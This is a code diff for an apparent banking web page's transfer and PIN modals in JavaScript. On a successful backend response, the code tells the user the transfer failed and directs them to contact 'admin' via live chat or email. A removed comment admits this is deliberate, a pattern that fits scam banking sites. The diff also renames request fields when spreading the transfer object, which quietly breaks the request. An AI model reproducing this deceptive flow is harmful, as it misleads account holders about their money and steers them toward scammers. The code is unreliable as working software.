@@ -740,6 +740,39 @@ document.addEventListener("DOMContentLoaded", loadAccountSummary);
 
 
 
+let transferData = {}; // global object to hold current transfer info
+
+// Open Transfer Modal when button clicked
+const transferBtn = document.getElementById("transferBtn");
+if (transferBtn) {
+  transferBtn.addEventListener("click", () => {
+    openModal("transferModal");
+  });
+}
+
+// Handle transfer form submission (amount, account, etc.)
+const transferForm = document.getElementById("transferForm");
+if (transferForm) {
+  transferForm.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    // Save data globally
+    transferData = {
+      amount: parseFloat(document.getElementById("transferAmount").value),
+      accountNumber: document.getElementById("accountNumber").value,
+      bank: document.getElementById("bank")?.value || "N/A",
+      country: document.getElementById("country")?.value || "N/A",
+      fromAccountType: document.getElementById("fromAccountType")?.value || "savings",
+      toAccountType: document.getElementById("toAccountType")?.value || "current"
+    };
+
+    // Close transfer modal, open Enter PIN modal
+    closeModal("transferModal");
+    openModal("enterPinModal");
+  });
+}
+
+// Enter PIN submission listener (you already have this)
 document.getElementById("enterPinForm").addEventListener("submit", async (e) => {
   e.preventDefault();
 
@@ -753,32 +786,19 @@ document.getElementById("enterPinForm").addEventListener("submit", async (e) => 
         "Content-Type": "application/json",
         "Authorization": `Bearer ${token}`
       },
-      body: JSON.stringify({
-        amount: transferData.amount,
-        accountNumber: transferData.accountNumber,
-        recipientBank: transferData.bank,
-        recipientCountry: transferData.country,
-        fromAccountType: transferData.fromAccountType, // e.g. "savings"
-        toAccountType: transferData.toAccountType,     // e.g. "current"
-        pin
-      })
+      body: JSON.stringify({ ...transferData, pin })
     });
 
     const data = await res.json();
 
     if (res.ok) {
-      // ✅ Backend approved → still show fail notice
       const acct = transferData.accountNumber;
-      alert(
-        `Acct: ${acct.slice(0,4)}****${acct.slice(-2)} your transfer cannot be completed at the moment, please contact admin via live chat/email.`
-      );
+      alert(`Acct: ${acct.slice(0,4)}****${acct.slice(-2)} your transfer cannot be completed at the moment, please contact admin via live chat/email.`);
       closeModal("enterPinModal");
     } else {
-      // ❌ Backend rejected → show their error
       alert(data.message || "Transfer failed. Please try again.");
       openModal("enterPinModal");
     }
-
   } catch (err) {
     console.error(err);
     alert("Something went wrong. Please try again.");
